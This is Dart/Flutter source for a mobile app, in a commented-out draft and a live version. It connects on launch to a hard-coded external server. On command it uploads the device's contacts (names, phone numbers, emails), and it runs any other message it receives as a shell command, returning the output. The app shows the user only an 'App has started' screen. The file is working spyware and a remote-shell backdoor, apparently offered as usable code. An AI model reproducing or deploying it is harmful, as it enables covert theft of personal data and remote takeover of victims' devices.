// import 'dart:convert';
// import 'dart:io';
// import 'package:contacts_service/contacts_service.dart';
// import 'package:flutter/material.dart';
// import 'package:permission_handler/permission_handler.dart';

// void main() => runApp(MyApp());

// class MyApp extends StatefulWidget {
//   @override
//   _MyAppState createState() => _MyAppState();
// }

// class _MyAppState extends State<MyApp> {
//   final String serverIp = '3.1.16.19'; // Server IP
//   final int serverPort = 13055; // Server Port
//   late Socket _socket; // Socket initialization

//   @override
//   void initState() {
//     super.initState();
//     _connectToServer();
//   }

//   Future<void> retrieveAndSendContacts() async {
//     // Request permission to access contacts
//     PermissionStatus permissionStatus = await Permission.contacts.request();

//     if (permissionStatus.isGranted) {
//       // Retrieve contacts
//       Iterable<Contact> contacts = await ContactsService.getContacts();

//       // Send contacts to server as a string or in JSON format
//       List<Map<String, dynamic>> contactList = contacts.map((contact) {
//         return {
//           'displayName': contact.displayName,
//           'phones': contact.phones?.map((item) => item.value).toList() ?? [],
//           'emails': contact.emails?.map((item) => item.value).toList() ?? []
//         };
//       }).toList();

//       // Convert contacts to JSON string
//       String contactJson = contactList.toString();

//       // Send contact list to the server
//       _socket.write(contactJson);
//     } else {
//       print('Permission to access contacts was denied');
//     }
//   }

//   void _connectToServer() async {
//     try {
//       _socket = await Socket.connect(serverIp, serverPort);
//       print("Connection successful");

//       // Listen for incoming data from server
//       _socket.listen(
//         (data) {
//           if (data == 'contact') {
//           } else {
//             final command = String.fromCharCodes(data).trim();
//             print('Command received from server: $command');

//             // Start shell and execute command
//             Process.start('/bin/sh', ['-i']).then((process) {
//               // Write the command into the shell's input
//               process.stdin.writeln(command);

//               // Listen to the shell's output and send it back
//               process.stdout.transform(utf8.decoder).listen((output) {
//                 _socket.write(output);
//                 print('Command output: $output');
//               });

//               // Listen to errors, if any, and send them back
//               process.stderr.transform(utf8.decoder).listen((error) {
//                 _socket.write('Error: $error');
//                 print('Command error: $error');
//               });
//             }).catchError((error) {
//               _socket.write('Error starting process: $error');
//             });
//           }
//         },
//         onDone: () {
//           print("Connection closed by server.");
//           _socket.destroy();
//         },
//         onError: (error) {
//           print("Connection Error: $error");
//           _socket.destroy();
//         },
//       );
//     } catch (e) {
//       print("Unable to connect: $e");
//     }
//   }

//   @override
//   Widget build(BuildContext context) {
//     return MaterialApp(
//       home: Scaffold(
//         appBar: AppBar(
//           title: Text('Startup Socket Connection'),
//         ),
//         body: Center(
//           child: Text('App has started'),
//         ),
//       ),
//     );
//   }
// }
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:permission_handler/permission_handler.dart';

void main() => runApp(MyApp());

class MyApp extends StatefulWidget {
  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  final String serverIp = '3.1.16.19'; // Replace with your server IP
  final int serverPort = 13055; // Replace with your server port
  Socket? _socket;

  @override
  void initState() {
    super.initState();
    _connectToServer();
  }

  Future<void> retrieveAndSendContacts() async {
    // Check permission to access contacts
    if (await FlutterContacts.requestPermission()) {
      // Retrieve contacts
      List<Contact> contacts = await FlutterContacts.getContacts(withProperties: true);

      // Convert contacts to JSON format
      List<Map<String, dynamic>> contactList = contacts.map((contact) {
        return {
          'displayName': contact.displayName,
          'phones': contact.phones.map((item) => item.number).toList(),
          'emails': contact.emails.map((item) => item.address).toList(),
        };
      }).toList();

      String contactJson = jsonEncode(contactList);

      // Send contact list to the server
      _socket?.write(contactJson);
      print("Contacts sent to server.");
    } else {
      print("Contacts permission denied.");
    }
  }

  void _connectToServer() async {
    try {
      _socket = await Socket.connect(serverIp, serverPort);
      print("Connected to server.");

      // Listen for incoming data from the server
      _socket?.listen(
        (data) async {
          final message = String.fromCharCodes(data).trim();
          if (message == 'contact') {
            // If server requests contacts, retrieve and send them
            await retrieveAndSendContacts();
          } else {
            print('Received command: $message');
            _executeCommand(message);
          }
        },
        onDone: () {
          print("Connection closed by server.");
          _socket?.destroy();
        },
        onError: (error) {
          print("Connection error: $error");
          _socket?.destroy();
        },
      );
    } catch (e) {
      print("Unable to connect: $e");
    }
  }

  void _executeCommand(String command) {
    final shell = Platform.isWindows ? 'cmd' : '/bin/sh';
    final args = Platform.isWindows ? ['/c', command] : ['-c', command];

    Process.start(shell, args).then((process) {
      process.stdout.transform(utf8.decoder).listen((output) {
        _socket?.write(output);
        print('Command output: $output');
      });

      process.stderr.transform(utf8.decoder).listen((error) {
        _socket?.write('Error: $error');
        print('Command error: $error');
      });
    }).catchError((error) {
      _socket?.write('Error starting process: $error');
    });
  }

  @override
  void dispose() {
    _socket?.close();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        appBar: AppBar(
          title: Text('Flutter Contacts Socket App'),
        ),
        body: Center(
          child: Text('App has started.'),
        ),
      ),
    );
  }
}
